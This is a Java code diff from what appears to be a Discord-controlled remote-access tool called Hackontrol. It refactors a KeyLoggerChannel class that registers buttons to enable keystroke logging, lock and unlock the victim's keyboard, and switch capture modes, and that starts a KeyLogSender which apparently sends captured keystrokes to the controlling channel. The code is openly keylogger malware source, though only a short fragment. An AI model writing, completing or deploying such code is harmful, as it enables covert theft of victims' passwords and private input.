@@ -40,12 +40,7 @@ public class KeyLoggerChannel extends HackontrolChannel {
 	}
 
 	@Override
-	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerChannel.BUTTON_ENABLE, KeyLoggerChannel.BUTTON_DISABLE), ActionRow.of(KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerChannel.BUTTON_RAW_KEY_MODE, KeyLoggerChannel.BUTTON_TEXT_MODE, KeyLoggerChannel.BUTTON_CLEAR)).queue();
-	}
-
-	@Override
-	public void register(Registry registry) {
+	public void preInitialize(Registry registry) {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_ENABLE, context -> this.buttonEnable(context, true));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_DISABLE, context -> this.buttonEnable(context, false));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, context -> this.buttonLock(context, true));
@@ -53,6 +48,15 @@ public class KeyLoggerChannel extends HackontrolChannel {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_RAW_KEY_MODE, context -> this.buttonRawKeyMode(context, true));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_TEXT_MODE, context -> this.buttonRawKeyMode(context, false));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_CLEAR, this :: buttonClear);
+	}
+
+	@Override
+	public void initialize() {
+		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerChannel.BUTTON_ENABLE, KeyLoggerChannel.BUTTON_DISABLE), ActionRow.of(KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerChannel.BUTTON_RAW_KEY_MODE, KeyLoggerChannel.BUTTON_TEXT_MODE, KeyLoggerChannel.BUTTON_CLEAR)).queue();
+	}
+
+	@Override
+	public void postInitialize() {
 		KeyLogSender.start(this.channel);
 	}
 
